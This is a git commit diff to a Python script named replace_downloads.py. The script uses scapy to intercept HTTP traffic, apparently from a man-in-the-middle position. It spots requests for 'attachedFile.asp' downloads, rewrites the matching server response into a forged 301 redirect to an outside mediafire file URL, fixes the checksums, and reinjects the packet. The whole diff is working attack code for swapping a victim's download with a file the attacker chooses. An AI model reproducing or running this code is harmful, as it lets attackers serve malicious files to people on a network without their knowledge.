b64d7351a323684699298ce13db37901dd13ab7f
dashzou <fxfddfno@gmail.com>
2020-07-09 06:27:40 -0400

    replace files

--- replace_downloads.py
+++ replace_downloads.py
@@ -18,12 +18,15 @@ def process_packet(packet):
             if "attachedFile.asp?id_no" in str(scapy_packet[scapy.Raw].load):
                 print("[+] File Request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
-                print(scapy_packet.show())
         elif scapy_packet[scapy.TCP].sport == 80:
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file")
-                print(scapy_packet.show())
+                scapy_packet[scapy.Raw].load = 'HTTP/1.1 301 Moved Permanently\nLocation: http://download1083.mediafire.com/30chip39p7pg/seovws7ozer52um/file.txt\n\n'
+                del scapy_packet[scapy.IP].len
+                del scapy_packet[scapy.IP].chksum
+                del scapy_packet[scapy.TCP].chksum
+                packet.set_payload(bytes(scapy_packet))
     packet.accept()
 
 
